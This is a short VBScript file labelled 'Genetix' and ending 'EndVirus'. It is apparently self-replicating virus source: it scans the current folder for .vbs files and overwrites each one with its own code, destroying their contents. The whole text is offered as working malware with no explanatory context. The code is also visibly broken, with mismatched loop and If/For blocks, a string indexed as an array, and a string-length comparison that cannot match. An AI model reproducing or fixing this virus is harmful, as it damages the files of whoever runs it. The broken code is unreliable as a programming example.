'Genetix
Set FileObj = CreateObject("Scripting.FileSystemObject")
Set ScriptFileName = FileObj.GetFile(WScript.ScriptFullName)
source_dir = FileObj.GetAbsolutePathName(".")
Target_dir = source_dir
If InStrRev(Target_dir, "source_dir") <> Len(source_dir) Then
Target_dir = Target_dir & ""
End If
Set Dir = FileObj.GetFolder(Target_dir)
For Each f in Dir.Files
If StrComp(Right(f.Name, 4), ".vbs", 1) = 0 Then
Set OpenFile = FileObj.OpenTextFile(f.Name, 1)
Do While Not OpenFile.AtEndOfStream
FileData = OpenFile.ReadAll()
Loop
OpenFile.Close
DataArray = Split(FileData, vbCrLf)
Set OpenVirus = FileObj.OpenTextFile(CStr(ScriptFileName), 1)
Set WriteVirus = FileObj.CreateTextFile(f.Name, 2)
Do While Not OpenVirus.AtEndOfStream
FileData = OpenVirus.ReadLine()
For i = 0 To UBound(DataArray)
If Left(FileData, 7) = "'EndVirus" Then Exit Do
If InStr(FileData(i), "'Genetix") = 0 Then
WriteVirus.WriteLine FileData
Loop
WriteVirus.WriteLine vbCrLf & "'EndLog"
WriteVirus.WriteLine vbCrLf & FileData(i)
WriteVirus.Close
OpenVirus.Close
End If
End If
Next
Next

'EndVirus